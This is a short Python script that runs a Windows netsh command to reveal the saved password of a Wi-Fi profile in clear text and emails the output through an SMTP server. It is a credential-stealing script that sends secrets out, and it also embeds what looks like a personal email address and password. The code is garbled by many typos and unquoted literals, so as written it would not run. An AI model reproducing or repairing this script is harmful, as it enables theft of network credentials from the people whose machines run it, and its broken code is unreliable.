import subprocess
import smtplib
def send_mail(email,password,messsage):
    server=smtplib.SMTP("SMTP.gamil.com")
    server.startlist()
    server.login(email,password)
    server.sendmail(email,email, message)
    server.quit()
command="netsh wlan show profile DSLAB key=clear"
resut=subprocess.check_utput(command, shell=True)
send_mail(rameshgiir76370@gmail.com,vicky69123807,result)